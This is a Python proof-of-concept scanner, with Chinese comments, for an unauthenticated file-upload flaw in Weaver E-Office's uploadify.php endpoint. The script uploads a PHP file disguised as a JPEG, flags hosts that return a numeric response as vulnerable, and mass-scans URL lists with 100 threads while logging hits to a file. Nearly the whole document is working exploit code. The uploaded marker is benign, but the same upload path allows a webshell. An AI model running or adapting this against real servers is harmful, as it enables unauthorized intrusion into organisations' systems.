#泛微E-Office uploadify.php后台文件上传漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """███████╗██╗    ██╗ ██████╗  █████╗       ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
██╔════╝██║    ██║██╔═══██╗██╔══██╗      ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
█████╗  ██║ █╗ ██║██║   ██║███████║█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
██╔══╝  ██║███╗██║██║   ██║██╔══██║╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
██║     ╚███╔███╔╝╚██████╔╝██║  ██║      ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚═╝      ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝       ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                           

"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微E-Office uploadify.php后台文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/inc/jquery/uploadify/uploadify.php'
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_8_4)AppleWebKit/537.36(KHTML,likeGecko)Chrome/49.0.2656.18Safari/537.36',
        'Connection':'close',
        'Content-Length':'259',
        'Content-Type':'multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4',
        'Accept-Encoding':'gzi',
    }
    data = """--e64bdf16c554bbc109cecef6451c26a4
                Content-Disposition: form-data; name="Filedata"; filename="CHKer.php"
                Content-Type: image/jpeg


                <?php echo "CHKer";unlink(__FILE__);?>


                --e64bdf16c554bbc109cecef6451c26a4--"""
    
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10,proxies=proxies)
        # print(res1.status_code)
        if res1.status_code == 200 and res1.text.isdigit():
            print(f"[+]漏洞存在{target}")
            with open('result3.txt','a',encoding='utf-8') as fp:
                    fp.write(f'{target}'+'\n')
        else:
            print(f"[-]漏洞不存在{target}")
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()